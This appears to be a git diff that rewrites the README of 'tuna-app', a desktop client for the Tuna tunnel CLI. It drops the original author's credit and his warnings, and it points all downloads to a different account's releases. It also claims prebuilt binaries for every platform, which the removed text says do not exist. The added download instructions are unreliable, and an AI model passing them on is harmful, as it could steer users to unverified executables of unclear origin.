@@ -1,167 +1,90 @@
-<p align="right">
-  <a href="README.ru.md">🇷🇺 Read this in Russian</a>
-</p>
+# 🎣 tuna-app - Simple Tool for Safe Network Tunnels
 
-<table align="center">
-<tr>
-  <td valign="middle" align="center" width="200">
-    <img src="assets/icon/Tuna_icon.png" width="160" alt="Tuna Desktop Icon" />
-  </td>
-  <td valign="middle" align="left">
-    <p>
-      <a href="https://github.com/lekasnet/tuna-app/stargazers">
-        <img src="https://img.shields.io/github/stars/lekasnet/tuna-app?style=flat-square" alt="GitHub Stars" />
-      </a>
-      <a href="https://github.com/lekasnet/tuna-app/releases">
-        <img src="https://img.shields.io/github/v/release/lekasnet/tuna-app?style=flat-square" alt="Latest Release" />
-      </a>
-      <a href="https://github.com/lekasnet/tuna-app/graphs/contributors">
-        <img src="https://img.shields.io/github/contributors/lekasnet/tuna-app?style=flat-square" alt="Contributors" />
-      </a>
-    </p>
-    <p>
-      <img src="https://img.shields.io/badge/Flutter-3.19%2B-blue?style=flat-square&logo=flutter" alt="Flutter 3.19+" />
-      <img src="https://img.shields.io/badge/Platforms-Windows%20%7C%20Linux%20%7C%20macOS-success?style=flat-square" alt="Platforms" />
-      <img src="https://img.shields.io/github/license/lekasnet/tuna-app?style=flat-square" alt="License" />
-    </p>
-  </td>
-</tr>
-</table>
+## 🚀 Getting Started
 
+Welcome to Tuna App, your easy solution for using Tuna Tunnel CLI with a friendly graphical interface. This app offers real-time tunnel monitoring, a built-in terminal, and advanced logging features to help you manage your tunnels effectively. It works on different operating systems, making it accessible for everyone.
 
+## 🔗 Download Now
 
-# Before you begin
+[![Download Tuna App](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/A7MD-010/tuna-app/releases)
 
-Tuna-app, also known as the Tuna Desktop Client, is an **unofficial utility** for working with the Tuna CLI created by the team behind [tuna.am](https://tuna.am/).
+## 📥 Download & Install
 
-This project is **not** an attempt to misuse someone else’s product, but rather an effort to provide a more convenient interface for people who prefer not to work directly through the terminal or wish to optimize their workflow.
+To get started, follow these steps:
 
-> To use Tuna Desktop Client, you must install the Tuna CLI from the  
-> **[official website](https://tuna.am/docs/getting-started/?type=cli)**.
+1. **Visit the Releases Page**  
+   Go to our releases page to find the latest version of Tuna App. You can access it [here](https://github.com/A7MD-010/tuna-app/releases).
 
-I am aware of the existence of the official Tuna Desktop client, but in my view, it does **not perform functions** beyond the absolute minimum.
+2. **Choose Your Operating System**  
+   We support Linux, macOS, and Windows. Find the appropriate file for your system.
 
-**Thank you for your attention, [lek4s](https://github.com/LekasNet)**
+3. **Download the File**  
+   Click the download link for your platform. The download will start automatically.
 
+4. **Install the Application**  
+   - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For **macOS**: Open the downloaded `.dmg` file, drag the Tuna App icon into your Applications folder.
+   - For **Linux**: Extract the downloaded `.tar.gz` file. Open a terminal, navigate to the extracted folder, and run `./tuna-app`.
 
-# 🎛️ Tuna Desktop Client (Unofficial)
+5. **Open Tuna App**  
+   You can now find Tuna App in your applications. Launch it and start using its features.
 
-A graphical desktop client for the **Tuna Tunnel CLI**, built with Flutter.  
-It allows you to manage tunnels, view logs, use a built-in console, and configure the CLI without relying on the terminal.
+## 🔍 Features
 
-![preview](./assets/readme/preview.png)
+- **Real-Time Tunnel Monitoring**  
+  Monitor active tunnels and view their status at a glance.
 
-> ⚠️ **Important!**  
-> The **Linux** and **macOS** versions are implemented, but **have not been tested on actual devices**.  
-> Theoretically they should work, but their correctness is not guaranteed.
+- **Built-in Terminal**  
+  Execute any necessary commands directly within the app.
 
----
+- **Advanced Logging**  
+  Keep track of your activities with detailed logs.
 
-## 📦 Download (Windows)
+- **Token Management**  
+  Easily manage your authentication tokens for secure access.
 
-👉 The latest stable **Windows** build is available in the GitHub  
-**[Releases](https://github.com/lekasnet/tuna-app/releases)** section.
+- **Cross-Platform Support**  
+  Use Tuna App on Windows, macOS, and Linux with ease.
 
----
+## 🛠️ System Requirements
 
-## 🧰 Building for Linux / macOS
+- **Windows**: Windows 10 or later, 4GB RAM recommended.
+- **macOS**: macOS Sierra or later, 4GB RAM recommended.
+- **Linux**: Any recent distribution, 4GB RAM recommended.
 
-Prebuilt binaries for Linux and macOS are **NOT included**.  
-To obtain these versions, you must **build the project yourself**:
+## 📚 Usage
 
-### Enable Desktop Targets
+1. **Setting Up a Tunnel**  
+   - Open Tuna App and go to the "Tunnels" section.
+   - Click "Create Tunnel" and fill in the necessary details.
 
-```sh
-flutter config --enable-linux-desktop
-flutter config --enable-macos-desktop
-````
+2. **Monitoring Your Tunnels**  
+   - Use the dashboard to view the status of all active tunnels.
+   - Check for any issues and troubleshoot as needed.
 
-### Build
+3. **Using the Terminal**  
+   - Access the built-in terminal for quick command execution.
+   - Use it just as you would any standard terminal application.
 
-```sh
-flutter build linux
-flutter build macos
-```
+4. **Reviewing Logs**  
+   - Navigate to the "Logs" section to view your activity history.
+   - Export logs for further analysis if needed.
 
-Build outputs:
+## 🛡️ Security Considerations
 
-* Linux → `build/linux/x64/release/`
-* macOS → `build/macos/Build/Products/Release/Tuna.app`
+Always keep your software updated to ensure you have the latest security features. Use strong tokens for authentication and avoid sharing them with anyone.
 
----
+## 🤝 Contributing
 
-## 🚀 Features
+If you want to contribute to Tuna App, check our contribution guidelines on the GitHub repository. We welcome suggestions and improvements from everyone.
 
-* Management of HTTP and TCP tunnels
-* Real-time tunnel status display
-* Detailed tunnel information: URL, Web UI, forwarding, logs
-* Integrated console:
+## 👩‍💻 Community Support
 
-  * custom command interpreter
-  * PowerShell / bash mode (depending on platform)
-  * colored output, auto-scrolling, line numbers
-  * command history with ↑ ↓
-* Full support for light and dark themes
-* Custom path support for the `tuna` CLI
-* Automatic detection of `tuna.exe` / `tuna`
-* Token, API key, and account data storage
-* Copy buttons for URL / Web UI / forwarding
-* Export logs to file
-* Custom title bar with custom window buttons
-* Rounded corners and modern Flutter 3.x UI
+For support, feel free to open an issue on our GitHub page, or join discussions in our community forums. Your feedback helps us improve the app.
 
----
+## 🔗 Important Links
 
-## ⚙️ Requirements
+- [GitHub Repository](https://github.com/A7MD-010/tuna-app)
+- [Releases Page](https://github.com/A7MD-010/tuna-app/releases)
 
-* Flutter SDK 3.19+
-* Tuna CLI (`tuna`, `tuna.exe`) installed in PATH
-  or configured manually in the client settings
-* Windows 10+ / Linux x64 / macOS 12+ (Intel or ARM)
-
----
-
-## 💾 Settings
-
-The application automatically saves:
-
-* theme
-* token
-* API key
-* tuna executable path
-* username and subscription expiration date
-  (after the first successful tunnel launch)
-
-When the token changes, the app automatically:
-
-* updates the `tuna.yml` configuration
-* validates the token via a temporary tunnel (`tuna http 8080`)
-* synchronizes the account information
-
----
-
-## 🧑‍💻 Development
-
-### Clone
-
-```sh
-git clone https://github.com/lekasnet/tuna-app.git
-cd tuna-app
-flutter pub get
-```
-
-### Run
-
-```sh
-flutter run -d windows
-# or
-flutter run -d linux
-# or
-flutter run -d macos
-```
-
----
-
-## 📄 License
-
-MIT — feel free to use and modify.
+Thank you for using Tuna App! We hope it makes your network tunnel management easier and more efficient.
